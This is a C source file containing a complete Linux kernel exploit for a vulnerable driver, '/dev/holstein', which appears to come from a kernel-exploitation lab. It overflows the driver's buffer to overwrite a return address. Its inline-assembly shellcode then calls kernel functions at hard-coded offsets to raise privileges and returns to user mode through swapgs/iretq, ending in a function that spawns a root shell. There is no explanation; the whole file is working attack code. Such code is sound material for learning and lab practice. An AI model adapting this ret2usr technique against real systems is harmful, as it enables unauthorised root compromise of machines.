#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>

#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>

#include <linux/capability.h>
#include <linux/types.h>

#define DEBUG

#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)

#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

uint64_t user_rip;
uint64_t user_cs;
uint64_t user_rflags;
uint64_t user_rsp;
uint64_t user_ss;

void get_shell()
{
    if (getuid())
    {
        errExit("NO ROOT");
    }

    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};

    logOK("Got shell!");
    execve(argv[0], argv, envp);
}

void save_state()
{
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop qword ptr [rip+user_rflags];"
            ".att_syntax");

    user_rip = (uint64_t)(uintptr_t)get_shell;
    logInfo("Saved user state - RIP: 0x%lx, CS: 0x%lx, RFLAGS: 0x%lx, RSP: 0x%lx, SS: 0x%lx",
            user_rip, user_cs, user_rflags, user_rsp, user_ss);
}

void shellcode()
{
    __asm__(".intel_syntax noprefix;"
            "mov rax, [rbp+0x8];"
            "sub rax, 0x13d7d3;"
            "mov rbx, rax;"
            "mov rcx, rbx;"

            "add rcx, 0x6e240;"
            "xor rdi, rdi;"
            "call rcx;"

            "mov rcx, rbx;"
            "add rcx, 0x6e390;"
            "mov rdi, rax;"
            "call rcx;"

            "swapgs;"
            "mov r9, user_ss;"
            "push r9;"
            "mov r9, user_rsp;"
            "push r9;"
            "mov r9, user_rflags;"
            "push r9;"
            "mov r9, user_cs;"
            "push r9;"
            "mov r9, user_rip;"
            "push r9;"
            "iretq;"
            ".att_syntax");
}

int main(int argc, char **argv, char **envp)
{
    save_state();

    int fd = open("/dev/holstein", O_RDWR);
    if (fd == -1)
        errExit("open /dev/holstein failed");

    char buf[0x1000];

    memset(buf, 'A', sizeof(buf));

    read(fd, buf, 0x410);

    *(uint64_t *)&buf[0x408] = (uint64_t)&shellcode + 8;
    write(fd, buf, 0x410);

    close(fd);
    return 0;
}
